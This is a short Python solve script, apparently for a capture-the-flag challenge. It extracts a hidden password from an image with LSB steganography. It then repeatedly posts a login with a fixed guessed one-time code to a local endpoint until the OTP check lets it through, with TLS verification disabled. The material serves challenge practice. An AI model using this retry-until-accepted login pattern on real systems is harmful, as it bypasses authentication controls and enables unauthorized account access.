#### solve.py

```py
import requests
from stegano import lsb
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# challenge.png is one randomly generated comic strip that contains the password
message = lsb.reveal("challenge.png")

# change the URL and port here depending on the host
url = 'http://127.0.0.1/artist_login'

data = {
    'username': 'Picasso',
    'password': message.split(':')[1],
    'otp': '99'
}
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9,de-DE;q=0.8,de;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'DNT': '1',
    'Origin': 'http://127.0.0.1:5000',
    'Referer': 'http://127.0.0.1/artist',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"'
}

desired_redirect_url = 'http://127.0.0.1/artist'

while True:
    response = requests.post(url, headers=headers,
                             data=data, allow_redirects=True, verify=False)

    if response.url != desired_redirect_url:
        print("Success! Redirected to the desired page.")
        break

    print("Not yet redirected, trying again...")
```
